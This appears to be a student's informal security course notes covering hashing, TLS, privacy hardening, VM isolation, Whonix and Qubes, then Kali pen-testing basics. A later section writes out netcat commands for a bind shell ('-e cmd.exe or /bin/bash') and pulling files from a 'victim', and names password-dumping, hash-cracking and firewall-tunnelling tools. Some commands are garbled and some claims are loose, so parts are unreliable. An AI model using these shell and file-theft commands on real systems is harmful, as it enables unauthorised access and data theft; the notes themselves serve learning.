+HASH FUNCTIONS take data and covertes it to a fixed size string of cahracters, called hashes or digest messages.
+Its one way hash function. Provides integrity. examples MD5, SHA256,
+truecrypt , quickhash
+
+DIGITAL SIGNATURE is a hash value (fixed lenth hash value) that has been encrypted with the issuer provided key 
+a digital singed provides authnetication, non-repudiation, integrity. 
+a digital certificate issued by - means that the entity, say veriSign's private key was used to digitally sign the software.
+
+SSL or TLS use cryptpgrapy techonlogies. There are protocols to provide communication security. SSL is older
+SSL secure Socket Layer, SSL 2 and 3 are insecure.
+TSL transport Layer Security, 1, 1.2, and 1.3. It provides privacy or confidentiality, authetication and integrity
+
+SSL striping, attacker is acting as a proxy changing https to http
+arp spoofing or poisening. attcker send arp packects pretending to be the default gateway.
+kali has ethercap and arpspoof, ssl strip, caneenable, wifipineaple (hardware)
+use tunnel or vpn to prevent this (end to end ecription), arpwatch to monitor ethernet also sniffdet
+https is http over tls
+  
+An HTTPs server has a public key that is used to exchange session keys to start the encryption. We must authenticate the public key by using digital certifictes that are signed.
+X.509 is standard for security digital certificates. Policy design is poor.
+A DIGITAL CERTIFICATE is a digital document containing information about the owner of the certificate or website.
+The public key of the website and the digital signatures are validate by an authorized certificate authority.
+
+sslsniff to create fake certs.
+add on to firefox checks for certificate changes certificate patrol
+certificate pinning - process of associating a host with their expected X509 certificate or public key 
+
+END TO END ENCRYPTIONS - E2EE when the data is encrypted by the sender and decrypted by the recipient. Providers are ZRTP, OTR,  PGP, SSL/TLS.
+
+STENOGRAPHY - hiding (not encrypted) data in plain site, like a message in an image. A carrier is file containing the data. Openpuff, spammimic are stenography tools
+
+attackers will always try to avoid encryption, instead they will attack the sender or receiver. 
+
+dev.windows.com contains VM images and osboxes.org for linux. Good for testing.
+more sites 
+VMware Images http://www.osboxes.org/vmware-images/
+VirtualBox Images http://www.osboxes.org/virtualbox-images/
+VirtualBoxes – Free VirtualBox® Images http://virtualboxes.org/images/
+Windows VMs here https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
+
+VMWare free edition
+VMware Workstation Player http://www.vmware.com/products/player/faqs/faqs.html, click on download
+Workstation Player or Workstation Pro http://www.vmware.com/products/workstation/compare.html
+VirtualBox https://www.virtualbox.org/
+
+
+
+Windows 10 is a cloud based OS with cloud functionality; data syncing is the default, websites, browser hostory, password, key history, location/movement, movies, calls, name, 
+stocks, age, email, address, search, music, video, cortana is a data collection.
+disable windows 10 tracking - open source - good one, writen in python - https://github.com/10se1ucgo/DisableWinTracking/releases
+donotspy10 - closed source
+windows10 privacy and share
+windows10privacyfix
+w10privacy
+shutup10
+spybox antibeacon windows 10 - good one
+ashampoantiwindows 10
+windows privacy tweaker
+disable cortana for security reasons
+choose privacy settings for your device. Start, Settings, privacy icon. 
+wifi sense - used to share wifi password with contacts. Disable that.
+
+Windows 7 and 8 
+Customer experience improvement program or CEIP. 
+start menu - type experience, then change to no
+windows media player. Also disable privacy optionso or even delete application. Use VLC media player for windows 
+
+SE Linux - Gov uses them, highly secured, it is a kernel not a distribution
+devian, openBSD, and archlinux
+Ubuntu will send some information to third party  but can be configured. search for fix ubuntu
+debian - favorite for security, privacy and annonymity
+
+
+patching windows
+Websites
+Microsoft Security Bulletins https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx
+Common Vulnerabilities and Exposures http://www.cve.mitre.org/
+National vulnerability database https://nvd.nist.gov/
+
+automating windows patches
+secunia personal inspector - flexera psi (free)
+appupdater
+filehippo
+ninite
+heimdal (free)
+dumo
+sumo lite
+software informer client
+
+debian - 
+use dpkg to install packages
+use apt as command line
+aptitude - front end for apt
+to upgrade os and applications - apt-get update && apt-get dist-upgrade
+apt-get update - used to syncronize package index files from their source (/etc/apt/soureces.list)
+apt-get upgrade - used to install newest version of all current packages. Will not delete packages.
+apt-get dist-upgrade - will do upgrade but also handles depencies with new versions. May delete packages.
+synaptic is a GUI for upgrading
+automatic upgrades - apt-get install unattened-upgrades , then edit /etc/apt/apt.conf.d/10periodic
+
+for MAC install homebrew for extra power tools, it is a package manager 
+
+firefox - 
+check for updates, click on menu, quention mark, then about firefox
+check for autmatic updates, click on menu, options, advanced, update 
+check for extensions/add-ons, click on menu, add ons, click on plugins and extensions, then gear, then checj for automatic updates.
+on brwser type about::suport to find conf details and about::config
+
+chrome - 
+not recommed chrome as a web browser. 
+click on menu, help, about chrome to check on updates
+
+IE - 
+not recommend IE
+windows update. check for microsoft update
+
+Do not run administrator as user as malware will have the level of priviledges of the user 
+Reducing or restricted priviledges will also reduce malware access. This alone will reduce attacks/malware by 86%
+
+https://tosdr.org to check social media sites information collection and distribution
+
+bugmenot.com - to share username/password for a generic ones
+use disposable email account to registering....its public
+same for sms notifications. use generic sites
+
+security controls behavior
+if you did not request it, dont click on it
+dont download and run any file
+dont enter sensitive information after a link of pop-up
+validate the link, (you can use urlvoid.com)
+minimize personal information disclosure
+validate the sender. you maybe able to see the raw email and examine the content you can use www.parsemail.org. also use reversedomain sites, and www.ghostmail.com, whois.domaintools.com,
+reverseip.domaintools.com, 
+validate the attahment, virustotal to check email and files for viruses.
+avoid the abvious threats; asking for bank accts, personal info. cc. etc.
+
+security controls technical
+use email provider that uses security controls. check on www.prxbx.com/email
+ 
+isolation and campartmentization is the most powerful security controls, using security domains.
+Example, use a Virtual Machine to browse the net
+MaC address - the first three bytes is the manufacture ID, and the last three unique to the NIC card. To change on Windows https://technitium.com/tmac. Linux use macchanger package
+also change mac address on VMs
+
+Hardware serial numbers.
+on windows use cpuz aplication from www.cpuid.com and on linux use inex from https://launchpad.net/i-nex 
+motherboard have serial numbers. on windows use wmic bios get name,serialnumber,version and wmic csproduct get name,identifyingnumber,uuid
+on linux use dmidecoder from www.nongnu.org/dmidecode 
+for harddirsk on windows try dir, or wmic diskdrive (or wmic diskdriveget serialnumber). For linux use package lshw 
+there are tools to change these serial number to accomplish annonymity. Additioanlly you can use VMs
+you can also accompliss isolation by physical isilation in storing data externally and not on the laptop or system
+
+for virtual isolation - portableapps.com and pendriveapps.com 
+portable apps are standalone applications and self - contained. This are contained on a folder and can be copied onto another system
+you can also store them on the cloud and run them remotely, giving you PHYSICAL ISOLATION
+cloud browsers do exist. https://authentic8.com,  www.maxthon.com, https://spikes.com,  https://spoon.net/browsers
+xen server can be used or even remote desktop 
+
+Dual booting can be used to set different security domains.  
+
+A sandbox is a security control excellent for isolation. These are isolated environments to run application or code, it is a virtual container.
+can be used to high risk application that interact with external sources like internet. Chrome and firefox uses chromium sandboxes. plugins and extnsions also use sandbox. Adove reader too. These
+are built-in sandboxes. 
+sandboxes can block exploits, protect files, and protect network. 
+bufferzonesecuroty.com (virtual container)
+www.shadowdefender.com 
+deep freeze by www.faronics.com
+returnil by www.returnilvirtualsystem.com 
+comodo firewall also offers has snadboxes ( has had security issues)
+sanboxie is a good one 
+
+sandbox for linux - aapAmor - recommed it
+sandfox 
+sandbox for linux (notive)
+firejail
+
+VMs are kind of a sandbox, stablishing isolation compartilization via virtualization.
+vagrant (vm)
+
+type 1 ( or native, or bare metal) hypervisor are VMware ESX, MS myperV, XenServer, oracle VM server. The OS is the hyperisor
+Hybrid (type 1 and 2). KVM, kernel Virtual Machine, Use it with KVM manager. Comes with GNU base OS
+OpenVZ
+linuxcontainers
+FreeBSD uses jails
+docker - containers that share OS, much more efficient in terms of resources.
+virtual appliance - www.turnkeylinux.org - recommend
+
+VM weakness 
+Host or Hypervisor can be vulnerable
+some malware will disable itslef or delete when it detect it is running on a VM
+since CPU are shared between the host and VM, a malware can pass authorized information to another process. This is called timing chanel or covert channel
+
+VM hardening 
+Use physical isolation (another laptop or machine)
+Use usb network dongle instead of the host NIC. Configure VM on a separate NIC or vlan
+use whole disk encryption or whole hidden OS and install HyperVisor and guest OS
+disable or delete caching, swap, paggin, sleeping, hivernating
+enable encryption on VM, 
+disable audio and microphone, cover webcam disbale shared folder, disable drag/drop and clipboard, dont enable video and  and 3d accelation, disable serial ports, dont install tools, 
+revome floppy drive, CD, DVD, virtual disks, dont attach usb devies, disable usb controller, dont enable remote display server, nor EFI, enable OAE/NX, dont add virtual storage, 
+use snapshots and restore to clean VM,    
+
+whonix OS - OS focused on annonymity, privacy, and security. Uses tor network, based on debian/GNU, security on isolation. 
+Hides ISP ipaddress, prevent ISP from spying on you, websites and malware from identifying you, help circnvent censorship.
+focus on isolation, soly run connections with TOR, isolated networks, run application and services over the internet annonymously, DNS exploits and malware will not find user's IP address.
+www.whonix.org - Works on virtual box, KVM and qubes. For best security use whonix with qubes.
+there is whonix gateway and whonix workstation. Its a two VM solution
+whonix gateway has to adapters, the NAT and internal network. 
+whonix workstation - only an internal network
+the gateway creates tor connection. You can connect any system to the gateway, just connect your machine to the whonix network of the gateway.
+The gateway uses tor sockproxy then onto the 3 layers of nones and finally to the workstation. An application without socksproxy will use a transparent proxy but will use the same 3 layer nodes.
+tor prevent identity correlation with the 3 layer nodes. 
+whonix can be run on a physical machine
+whonix is not amnesiac, but can be performed by restoring clean/virgin snapshots after usage
+
+qubes OS. best desktop to implement isolation and compartilization. Strong security for desktop, based on Xen Hypervisor, X windows and linux.
+Uses virtualization to inforce security domain through isolation compartmentalization. 
+www.qubes-os.org
+
+Monolithic kernel means lots of code run with high level proviledges, or trusted computer based or TCB 
+Microkernal means isolation enforcing code. Xen uses it that equals to less potential security comprimises. 
+Qubes enforces security domains. No host OS is used as XEN in the OS.
+
+security domains, isolation and compartilization, Examples
+for security (malware/hackers) - use your os with a debin VM to go out to the internet
+for privacy and local forensic - use debian and OS and tail as virtual box
+for tracking and hackers - use your os and a USB running live knopix to go out to the internet
+for simple isolation - Use windows as your OS and sandbox the browser 
+nation state adversary - use qubes and whonix
+for travel - use a laptop with no sensitive date and use cloud with 2 factor authentication.
+
+--------------volume 2
+www.shodan.io for devices and vulnerabilites, use for exploit database
+www.whatsmyipaddress.com
+https://pentest-tools.com/network-vulnerability-scanning/tcp-port-scanner-online-nmap 
+to check if my IP address is on a vulnerability database go www.techmonkeys.co.uk/hackcheck/index.php
+
+on windows passwords are kept in SAM of Security Account Manager 
+to extract use www.tarasco.org - password dumper
+in kali, use hashcat 
+hasid (hash) 
+to decrypr online - www.raymond.cc, craskstation.net
+
+to bypass a firewall
+look at the browser to see the ip address. 
+http proxy uses https-connect
+https proxy is a full https, that breaks the https then will re-https
+tolls - corckscrew for tunnelling ssh via https proxy
+proxytunnel is another tool
+httptunnel
+barbatunnel
+
+email - fundamentally broken and cannot be fixed. 
+port 143 imap and 110 pop and unencryted
+port 993 imap and 995 pop3 are encrypted TLS/SSL 
+imap syncs client and servers
+pop stores on client and deltes from server
+smtp port 25 to sendemail unencryptes
+starttls port 587  and smtp 465 encryted (preffere)
+on kali run sslscan www.ghostmail.com
+www.checktls.com - to check on email 
+use nc (netcat)
+
+----------------------------
+ETHICAL HACKING KALI LINUX
+
+penetration testing - reconaisance, scanning, exploitation, post-exploitation
+armitage needs to be upgraded. 
+apt-get update
+apt-get upgrade
+apt-get dist-upgrade
+
+updatedb - to build db for file and dirs
+locate (for search)
+
+netcat
+on a victim type, 
+nc -lvp 5555
+on attacker type 
+nc 192.168.1.1
+then type back and forth
+
+a banner is any information displayed by a service on an open port,
+nc 192.168.1.1 21
+
+to transfer a file from victim
+on attcher type
+nc 192.168.1.1 > 5555 fromVictim.txt
+on a victim type
+nc -lvp 5555 < file.txt
+content of victim file.txt will get put onto attacker as fromVictim file.txt 
+same can be done to send a file from attcker to victim
+on victim system
+nc -lvp 5555 > newfileFromAttacker.txt
+on attacker
+nc 192.168.1.1 5555 < filefromAttacker.txt
+content of attacker file filefromAttaker.txt will be put on victim as file newfileFromAttacker.txt
+
+remote desktop
+on victim 
+nc -lvp 5555 -e cmd.exe or /bin/bash
+on attacker 
+nc 192.168.1.1 5555
+then type any command
+
+TCP 3 way hadshake
+Syn - Syn/Ack - Ack, then communication is established
+
+passive information is gathered by public searches
+google search - 
+use site operator. Ex site":microsoft.com"
+site:"microsoft.com" -site:"www.microsoft.com" ( -site is exlude)
+site:
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+ 
+
+ 
+
+
+
+
+ 
+ 
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+ 
+ 
+
+
+ 
+
+  
+
+
+
+
+
+
+
